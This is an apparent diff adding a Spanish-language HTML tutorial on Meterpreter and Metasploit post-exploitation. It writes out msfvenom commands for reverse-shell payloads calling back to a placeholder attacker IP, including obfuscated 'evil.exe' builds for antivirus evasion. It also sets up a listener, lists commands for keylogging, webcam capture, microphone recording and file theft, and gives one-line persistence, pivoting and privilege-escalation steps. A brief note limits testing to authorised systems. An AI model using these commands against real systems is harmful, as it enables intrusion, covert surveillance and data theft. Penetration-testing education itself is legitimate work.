@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Guía completa de Meterpreter</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 20px; }
+        h1, h2, h3 { color: #2c3e50; }
+        pre { background: #ecf0f1; padding: 10px; overflow-x: auto; }
+        table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
+        table, th, td { border: 1px solid #bdc3c7; }
+        th, td { padding: 8px; text-align: left; }
+    </style>
+</head>
+<body>
+
+<h1>Guía completa de Meterpreter</h1>
+
+<h2>1. ¿Qué es Meterpreter?</h2>
+<p>Meterpreter es un <strong>payload</strong> dinámico y en memoria, parte integral del framework de explotación Metasploit, diseñado para proporcionar al pentester o al atacante un canal de control muy potente y flexible en la máquina objetivo sin dejar rastros en disco.</p>
+
+<h3>Características principales</h3>
+<ul>
+    <li><strong>Ejecución en memoria</strong>: se carga directamente en la memoria del proceso víctima, evitando dejar ejecutables en disco.</li>
+    <li><strong>Canal cifrado y multiplexado</strong>: comunicación cifrada sobre TCP (o HTTP(S), DNS, etc.) con múltiples streams en una sesión.</li>
+    <li><strong>Modularidad y extensiones</strong>: permite cargar funcionalidades adicionales en tiempo real (priv, stdapi, kiwi).</li>
+</ul>
+
+<h3>Flujo típico de uso</h3>
+<ol>
+    <li><strong>Generación y entrega del payload</strong> (con msfvenom).</li>
+    <li><strong>Apertura de listener</strong> en Metasploit.</li>
+    <li><strong>Establecimiento de sesión</strong> una vez explotada la vulnerabilidad.</li>
+    <li><strong>Post-explotación</strong> con comandos dedicados (sysinfo, ps, screenshot, etc.).</li>
+</ol>
+
+<h2>2. Consola amigable y útiles características</h2>
+<ul>
+    <li><strong>Autocompletado</strong> de comandos y rutas con Tab.</li>
+    <li><strong>Historial</strong> de órdenes con flechas arriba/abajo.</li>
+    <li><strong>Múltiples streams</strong> (subshells, tráfico, cámara, screenshots).</li>
+    <li><strong>Carga dinámica de extensiones</strong> (use kiwi, stdapi, priv).</li>
+    <li><strong>Integración con Metasploit</strong> (sessions -l, pivot, migrate).</li>
+    <li><strong>Comandos dedicados</strong> (sysinfo, getuid, upload/download, keyscan, migrate).</li>
+</ul>
+
+<h2>3. Preparación e instalación</h2>
+<h3>Entorno recomendado</h3>
+<ul>
+    <li><strong>Kali Linux</strong> (Metasploit preinstalado).</li>
+    <li><strong>Termux / WSL</strong> (requiere instalación manual).</li>
+</ul>
+
+<h3>Instalación en Kali</h3>
+<pre><code>sudo apt update && sudo apt upgrade -y
+msfconsole --version</code></pre>
+
+<h3>Instalación manual (Debian/Ubuntu)</h3>
+<pre><code>sudo apt install -y curl gnupg2 postgresql libpq-dev build-essential
+curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate.sh | sudo bash
+sudo systemctl start postgresql
+msfdb init</code></pre>
+
+<h2>4. Generación de payloads con msfvenom</h2>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f exe -o /tmp/evil.exe
+
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=TU_IP LPORT=8080 -f psh-text > shell.ps1
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/evil_obf.exe</code></pre>
+
+<h2>5. Configurar el listener en msfconsole</h2>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+
+sessions -l
+sessions -i 1</code></pre>
+
+<h2>6. Comandos básicos de Meterpreter</h2>
+<table>
+    <tr><th>Comando</th><th>Descripción</th></tr>
+    <tr><td>sysinfo</td><td>Información del SO víctima</td></tr>
+    <tr><td>getuid</td><td>Usuario de la sesión</td></tr>
+    <tr><td>ps</td><td>Listado de procesos</td></tr>
+    <tr><td>migrate &lt;PID&gt;</td><td>Migrar a otro proceso</td></tr>
+    <tr><td>shell</td><td>Shell de sistema</td></tr>
+    <tr><td>download &lt;ruta&gt; .</td><td>Descarga ficheros</td></tr>
+    <tr><td>upload file.exe C:\\</td><td>Sube ficheros</td></tr>
+    <tr><td>screenshot</td><td>Captura de pantalla</td></tr>
+    <tr><td>keyscan_start/stop</td><td>Registro de teclas</td></tr>
+    <tr><td>webcam_snap</td><td>Foto desde la webcam</td></tr>
+    <tr><td>record_mic/stop_mic</td><td>Graba audio del micrófono</td></tr>
+</table>
+
+<h2>7. Técnicas avanzadas y trucos</h2>
+<ul>
+    <li><strong>Migración inteligente</strong>: elegir procesos confiables (ps -S explorer.exe).</li>
+    <li><strong>Pivoting de red</strong>: run autoroute -s 192.168.1.0/24, portfwd add -l 3389 -p 3389 -r 10.0.0.5.</li>
+    <li><strong>Persistencia</strong>: run persistence -U -i 10 -p 4444 -r TU_IP.</li>
+    <li><strong>Evasión AV</strong>: reflective DLL injection, msfvenom -e shikata_ga_nai, Veil/Donut.</li>
+    <li><strong>Elevación de privilegios</strong>: run post/windows/escalate/getsystem, local_exploit_suggester.</li>
+    <li><strong>Recogida rápida</strong>: post/windows/gather scripts (enum_logged_on_users, enum_applications, enum_chrome).</li>
+    <li><strong>Automatización</strong>: Resource scripts (.rc), AutoRunScript.</li>
+</ul>
+
+<h2>8. Buenas prácticas y precauciones</h2>
+<ul>
+    <li>Entorno aislado (VMs, redes NAT).</li>
+    <li>Limpieza tras pruebas (persistencias, payloads).</li>
+    <li>Monitorizar logs (~/.msf4/logs/).</li>
+    <li>Mantener herramientas actualizadas.</li>
+    <li>Pruebas solo en sistemas autorizados.</li>
+</ul>
+
+<h2>9. Resumen de trucos clave</h2>
+<ul>
+    <li>Tab-completion e historial para eficiencia.</li>
+    <li>Migrar a procesos adecuados para estabilidad.</li>
+    <li>Pivoteo de red desde la misma sesión.</li>
+    <li>Persistencia con un solo comando.</li>
+    <li>Carga de módulos según necesidad.</li>
+    <li>Ofuscación de payloads para evadir detección.</li>
+</ul>
+
+</body>
+</html>
